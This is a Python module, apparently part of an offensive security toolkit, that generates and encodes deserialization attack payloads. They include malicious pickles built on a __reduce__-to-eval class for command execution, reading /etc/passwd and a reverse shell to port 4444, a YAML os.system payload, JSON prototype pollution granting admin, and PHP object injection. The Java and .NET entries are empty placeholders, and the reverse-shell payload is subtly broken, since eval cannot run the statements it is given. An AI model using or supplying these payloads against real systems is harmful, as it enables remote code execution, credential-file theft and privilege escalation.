import base64
import pickle
import json
import yaml
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from core.logger import log


@dataclass
class DeserializationPayload:
    name: str
    language: str
    format: str
    payload: bytes
    description: str
    risk_level: str


class DeserializationPayloadGenerator:
    def __init__(self):
        self.payloads = []
        self._generate_payloads()

    def _generate_payloads(self):
        """Generate various deserialization payloads"""
        # Python pickle payloads
        self._generate_python_payloads()

        # Java serialization payloads
        self._generate_java_payloads()

        # .NET serialization payloads
        self._generate_dotnet_payloads()

        # JSON deserialization payloads
        self._generate_json_payloads()

        # YAML deserialization payloads
        self._generate_yaml_payloads()

    def _generate_python_payloads(self):
        """Generate Python pickle deserialization payloads"""
        # Basic command execution
        cmd_payload = self._create_pickle_payload("os.system('id')")
        self.payloads.append(DeserializationPayload(
            name="Python Command Execution",
            language="python",
            format="pickle",
            payload=cmd_payload,
            description="Executes system command via pickle deserialization",
            risk_level="high"
        ))

        # File read
        file_read_payload = self._create_pickle_payload(
            "open('/etc/passwd').read()")
        self.payloads.append(DeserializationPayload(
            name="Python File Read",
            language="python",
            format="pickle",
            payload=file_read_payload,
            description="Reads sensitive files via pickle deserialization",
            risk_level="high"
        ))

        # Reverse shell
        reverse_shell_payload = self._create_pickle_payload(
            "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
        )
        self.payloads.append(DeserializationPayload(
            name="Python Reverse Shell",
            language="python",
            format="pickle",
            payload=reverse_shell_payload,
            description="Creates reverse shell via pickle deserialization",
            risk_level="critical"
        ))

    def _create_pickle_payload(self, code: str) -> bytes:
        """Create pickle payload for code execution"""
        import io
        import pickle

        class MaliciousPickle:
            def __reduce__(self):
                return (eval, (code,))

        return pickle.dumps(MaliciousPickle())

    def _generate_java_payloads(self):
        """Generate Java deserialization payloads"""
        # These would typically be generated using ysoserial
        # For now, we'll create placeholder payloads

        # CommonsCollections1 payload
        self.payloads.append(DeserializationPayload(
            name="Java CommonsCollections1",
            language="java",
            format="serialized",
            payload=b"",  # Would be populated by ysoserial
            description="Java deserialization using CommonsCollections1",
            risk_level="high"
        ))

        # CommonsBeanutils1 payload
        self.payloads.append(DeserializationPayload(
            name="Java CommonsBeanutils1",
            language="java",
            format="serialized",
            payload=b"",  # Would be populated by ysoserial
            description="Java deserialization using CommonsBeanutils1",
            risk_level="high"
        ))

    def _generate_dotnet_payloads(self):
        """Generate .NET deserialization payloads"""
        # ObjectDataProvider payload
        self.payloads.append(DeserializationPayload(
            name=".NET ObjectDataProvider",
            language="csharp",
            format="binary",
            payload=b"",  # Would be populated by ysoserial.net
            description=".NET deserialization using ObjectDataProvider",
            risk_level="high"
        ))

        # TypeConfuseDelegate payload
        self.payloads.append(DeserializationPayload(
            name=".NET TypeConfuseDelegate",
            language="csharp",
            format="binary",
            payload=b"",  # Would be populated by ysoserial.net
            description=".NET deserialization using TypeConfuseDelegate",
            risk_level="high"
        ))

    def _generate_json_payloads(self):
        """Generate JSON deserialization payloads"""
        # Node.js prototype pollution
        prototype_pollution = {
            "__proto__": {
                "isAdmin": True,
                "role": "admin"
            }
        }

        self.payloads.append(DeserializationPayload(
            name="JSON Prototype Pollution",
            language="javascript",
            format="json",
            payload=json.dumps(prototype_pollution).encode(),
            description="JSON prototype pollution attack",
            risk_level="medium"
        ))

        # PHP object injection
        php_object = {
            "payload": "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"data\";}"
        }

        self.payloads.append(DeserializationPayload(
            name="PHP Object Injection",
            language="php",
            format="json",
            payload=json.dumps(php_object).encode(),
            description="PHP object injection via JSON",
            risk_level="high"
        ))

    def _generate_yaml_payloads(self):
        """Generate YAML deserialization payloads"""
        # Python YAML deserialization
        yaml_payload = "!!python/object/apply:os.system ['id']"

        self.payloads.append(DeserializationPayload(
            name="YAML Python Object",
            language="python",
            format="yaml",
            payload=yaml_payload.encode(),
            description="YAML deserialization with Python object",
            risk_level="high"
        ))

        # Ruby YAML deserialization
        ruby_yaml = "--- !ruby/object:Gem::Installer"

        self.payloads.append(DeserializationPayload(
            name="YAML Ruby Object",
            language="ruby",
            format="yaml",
            payload=ruby_yaml.encode(),
            description="YAML deserialization with Ruby object",
            risk_level="high"
        ))

    def get_payloads_by_language(self, language: str) -> List[DeserializationPayload]:
        """Get payloads filtered by programming language"""
        return [p for p in self.payloads if p.language == language]

    def get_payloads_by_format(self, format_type: str) -> List[DeserializationPayload]:
        """Get payloads filtered by serialization format"""
        return [p for p in self.payloads if p.format == format_type]

    def get_high_risk_payloads(self) -> List[DeserializationPayload]:
        """Get high and critical risk payloads"""
        return [p for p in self.payloads if p.risk_level in ['high', 'critical']]

    def encode_payload(self, payload: DeserializationPayload, encoding: str = "base64") -> str:
        """Encode payload for transmission"""
        if encoding == "base64":
            return base64.b64encode(payload.payload).decode()
        elif encoding == "hex":
            return payload.payload.hex()
        elif encoding == "url":
            import urllib.parse
            return urllib.parse.quote(payload.payload)
        else:
            return payload.payload.decode('utf-8', errors='ignore')
